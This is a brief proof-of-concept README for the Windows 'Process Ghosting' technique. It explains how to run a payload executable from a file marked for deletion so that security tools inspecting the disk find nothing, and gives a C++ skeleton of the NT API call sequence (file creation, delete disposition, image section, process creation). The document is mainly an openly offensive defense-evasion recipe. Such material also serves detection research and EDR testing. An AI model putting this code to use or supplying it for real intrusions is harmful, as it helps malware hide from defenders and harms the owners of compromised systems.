<!-- generated-from-dump2 -->
# Process Ghosting PoC

PoC of "Process Ghosting" — a successor to Process Doppelgänging that does not require NTFS transactions. You create a file, mark it `FILE_DISPOSITION_DELETE` via `NtSetInformationFile` while still holding an open handle, write the payload PE into that delete-pending file, create a section from it, and spawn a process from the section. By the time anyone tries to inspect the image on disk it's already gone, but the kernel's section reference keeps the bytes alive — and CreateProcessNotify/EDR sees a phantom path.

```cpp
HANDLE file;
NtCreateFile(&file, DELETE|GENERIC_WRITE|SYNCHRONIZE, ..., FILE_CREATE,
             FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT, ...);

FILE_DISPOSITION_INFORMATION disp{ TRUE };
NtSetInformationFile(file, &iosb, &disp, sizeof(disp),
                     FileDispositionInformation);
// File is now delete-pending; close => disappears.

WriteFile(file, payloadPE, payloadSize, nullptr, nullptr);

HANDLE section;
NtCreateSection(&section, SECTION_ALL_ACCESS, nullptr, nullptr,
                PAGE_READONLY, SEC_IMAGE, file);
NtClose(file); // image is gone from disk, section still valid

HANDLE proc;
NtCreateProcessEx(&proc, PROCESS_ALL_ACCESS, nullptr, GetCurrentProcess(),
                  0, section, nullptr, nullptr, FALSE);
// + NtCreateThreadEx at payload entry, resume.
```

## References
- <https://github.com/hasherezade/process_ghosting>
